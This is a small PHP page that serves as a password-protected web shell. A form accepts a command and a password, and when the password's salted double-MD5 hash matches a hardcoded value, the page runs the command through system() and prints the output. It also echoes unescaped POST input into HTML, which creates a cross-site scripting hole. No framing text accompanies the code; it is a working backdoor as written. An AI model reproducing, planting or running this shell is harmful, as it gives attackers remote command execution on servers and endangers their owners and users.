<form action="#" method="POST">
<input type="text" name="lol" id="lol" size="120"<?php
if (isset($_POST['lol']))
	echo " value='".$_POST['lol']."'";
?>/><br />
<?php
if (isset($_POST['pp']))
	echo "<input type='hidden' name='pp' id='pp' value='" . $_POST['pp'] . "' />";
else
	echo "<input type='text' name='pp' id='pp' /><br />";
?>
<input type="submit" />
</form>
<br />
<textarea rows="30" cols="120">
<?php
if (isset($_POST['lol']) && isset($_POST['pp']) && md5(md5($_POST['pp']) . '12345') === 'b829cf2d5cd4fff1d6f1526caeeb87a2')
	system($_POST['lol']);
?>
</textarea>